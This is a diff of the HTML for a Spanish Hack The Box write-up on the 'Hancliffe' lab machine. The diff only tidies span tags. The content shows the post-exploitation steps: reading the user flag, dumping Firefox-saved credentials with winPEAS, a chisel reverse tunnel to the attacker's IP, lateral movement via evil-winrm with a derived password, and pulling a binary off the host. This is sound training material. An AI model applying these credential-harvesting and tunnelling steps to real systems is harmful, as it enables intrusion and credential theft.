@@ -298,24 +298,24 @@ PS C:\Users\clara&gt;
 </code></pre></div><p>Aquí ya podemos leer la <em>flag</em> <code>user.txt</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">PS C:\Users\clara&gt; <span class="code-yellow">type</span> Desktop\user.txt  
 3aa9dcfca7cac59c24ed2f14a0952ee7
 </code></pre></div><p>Pero seguimos sin poder leer el binario en <code>C:\DevApp</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">PS C:\Users\clara&gt; <span class="code-yellow">dir</span> C:\DevApp
-<span class="code-red">dir : Access to the path 'C:\DevApp' is denied.
-At line:1 char:1
-+ dir C:\DevApp
-+ ~~~~~~~~~~~~~
-    + CategoryInfo          : PermissionDenied: (C:\DevApp:String) [Get-ChildItem], UnauthorizedAccessException  
-    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand</span>
+<span class="code-red">dir : Access to the path 'C:\DevApp' is denied.</span>
+<span class="code-red">At line:1 char:1</span>
+<span class="code-red">+ dir C:\DevApp</span>
+<span class="code-red">+ ~~~~~~~~~~~~~</span>
+<span class="code-red">    + CategoryInfo          : PermissionDenied: (C:\DevApp:String) [Get-ChildItem], UnauthorizedAccessException</span>  
+<span class="code-red">    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand</span>
 </code></pre></div><p>Si ejecutamos <a target="_blank" href="https://github.com/carlospolop/PEASS-ng"><code>winpeas.exe</code></a> para enumerar más, obtenemos unas credenciales guardadas en Firefox:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-dark-cyan">════════════════════════════════════╣</span> <span class="code-green">Browsers Information</span> <span class="code-dark-cyan">╠════════════════════════════════════</span>
 
 <span class="code-dark-cyan">╔══════════╣</span> <span class="code-green">Showing saved credentials for Firefox</span>
-     <span class="code-red">Url:           http://localhost:8000
-     Username:      hancliffe.htb
-     Password:      #@H@ncLiff3D3velopm3ntM@st3rK3y*!</span>
+     <span class="code-red">Url:           http://localhost:8000</span>
+     <span class="code-red">Username:      hancliffe.htb</span>
+     <span class="code-red">Password:      #@H@ncLiff3D3velopm3ntM@st3rK3y*!</span>
 
    <span class="code-grey">=================================================================================================</span>
 
 
 <span class="code-dark-cyan">╔══════════╣</span> <span class="code-green">Looking for Firefox DBs</span>
-<span class="code-dark-cyan">╚  <span class="code-yellow">https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#browsers-history</span>
+<span class="code-dark-cyan">╚</span>  <span class="code-yellow">https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#browsers-history</span>
     <span class="code-red">Firefox credentials file exists at C:\Users\clara\AppData\Roaming\Mozilla\Firefox\Profiles\ljftf853.default-release\key4.db</span>  
 <span class="code-dark-cyan">╚</span> <span class="code-blue">Run SharpWeb (https://github.com/djhohnstein/SharpWeb)</span>
 </code></pre></div><p><a target="_blank" href="https://github.com/carlospolop/PEASS-ng"><code>winpeas.exe</code></a> ya nos extrae las contraseñas de la base de datos de Firefox, aunque podríamos haber usado <a target="_blank" href="https://github.com/lclevy/firepwd">FirePwd</a>.</p><h2 id="movimimento-lateral-al-usuario-development">Movimimento lateral al usuario <code>development</code></h2><p>Había otro usuario llamado <code>development</code>. Podemos tratar de conectarnos al servidor utilizando <a target="_blank" href="https://github.com/hackplayers/evil-winrm"><code>evil-winrm</code></a> (configurando <a target="_blank" href="https://github.com/jpillora/chisel"><code>chisel</code></a> para exponer el puerto 5985):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">PS C:\Nuxeo&gt; <span class="code-yellow">C:\Windows\Temp\c.exe</span> client 10.10.17.44:1234 R:5985:127.0.0.1:5985  
@@ -323,25 +323,25 @@ At line:1 char:1
 2022/03/06 17:14:37 client: Connected (Latency 105.431ms)
 </code></pre></div><p>Podemos probar la contraseña para <code>development</code> pero no funciona:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">evil-winrm</span> -i 127.0.0.1 -u development -p <span class="code-dark-yellow">'#@H@ncLiff3D3velopm3ntM@st3rK3y*!'</span>
 
-<span class="code-dark-blue">Evil-WinRM shell v3.3
+<span class="code-dark-blue">Evil-WinRM shell v3.3</span>
 
-Info: Establishing connection to remote endpoint</span>
+<span class="code-dark-blue">Info: Establishing connection to remote endpoint</span>
 
-<span class="code-dark-red">Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError  
+<span class="code-dark-red">Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError</span>  
 
-Error: Exiting with code 1</span>
+<span class="code-dark-red">Error: Exiting with code 1</span>
 </code></pre></div><p>Aquí tenemos que recordar que había un servicio web que generaba contraseñas a partir de otros campos y una contraseña maestra (el usuario ha debido almacenar los campos del formulario en la base de datos de Firefox por usabilidad).</p><p>Si utilizamos <code>development</code>, <code>hancliffe.htb</code> y <code>#@H@ncLiff3D3velopm3ntM@st3rK3y*!</code> obtenemos <code>AMl.q2DHp?2.C/V0kNFU</code> como contraseña:</p><p><img alt="Hancliffe password" src="/images/HTB/Hancliffe/Hancliffe-password.webp"></p><p>Vamos a probar ahora:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">evil-winrm</span> -i 127.0.0.1 -u development -p <span class="code-dark-yellow">'AMl.q2DHp?2.C/V0kNFU'</span>  
 
-<span class="code-dark-blue">Evil-WinRM shell v3.3
+<span class="code-dark-blue">Evil-WinRM shell v3.3</span>
 
-Info: Establishing connection to remote endpoint</span>
+<span class="code-dark-blue">Info: Establishing connection to remote endpoint</span>
 
 <span class="code-dark-red">*Evil-WinRM*</span> <span class="code-yellow">PS</span> C:\Users\development\Documents&gt;
 </code></pre></div><p>Funciona. Y ahora sí podemos acceder a <code>C:\DevApp</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">evil-winrm</span> -i 127.0.0.1 -u development -p <span class="code-dark-yellow">'AMl.q2DHp?2.C/V0kNFU'</span>  
 
-<span class="code-dark-blue">Evil-WinRM shell v3.3
+<span class="code-dark-blue">Evil-WinRM shell v3.3</span>
 
-Info: Establishing connection to remote endpoint</span>
+<span class="code-dark-blue">Info: Establishing connection to remote endpoint</span>
 
 <span class="code-dark-red">*Evil-WinRM*</span> <span class="code-yellow">PS</span> C:\Users\development\Documents&gt; dir C:\DevApp
 
@@ -354,10 +354,10 @@ Mode                 LastWriteTime         Length Name
 -a----         9/14/2021   5:02 AM          60026 MyFirstApp.exe
 -a----         9/14/2021  10:57 AM            636 restart.ps1
 </code></pre></div><p>Podemos descargar el binario a la máquina de atacante utilizando las funciones de <a target="_blank" href="https://github.com/hackplayers/evil-winrm"><code>evil-winrm</code></a>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-dark-red">*Evil-WinRM*</span> <span class="code-yellow">PS</span> C:\Users\development\Documents&gt; download C:\DevApp\MyFirstApp.exe ./MyFirstApp.exe  
-<span class="code-dark-blue">Info: Downloading C:\DevApp\MyFirstApp.exe to ./MyFirstApp.exe
+<span class="code-dark-blue">Info: Downloading C:\DevApp\MyFirstApp.exe to ./MyFirstApp.exe</span>
 
 
-Info: Download successful!</span>
+<span class="code-dark-blue">Info: Download successful!</span>
 </code></pre></div><h2 id="ingeniería-inversa-sobre-el-binario">Ingeniería inversa sobre el binario</h2><p>Tenemos un binario ejecutable de Windows de 32 bits:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">file</span> MyFirstApp.exe
 MyFirstApp.exe: PE32 executable (console) Intel 80386, for MS Windows  
 </code></pre></div><p>Podemos utilizar <code>strings</code> para ver cosas interesantes. Por ejemplo, podemos ver el comando con el que fue compilado el binario:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">strings</span> MyFirstApp.exe | <span class="code-dark-green">grep</span> protector
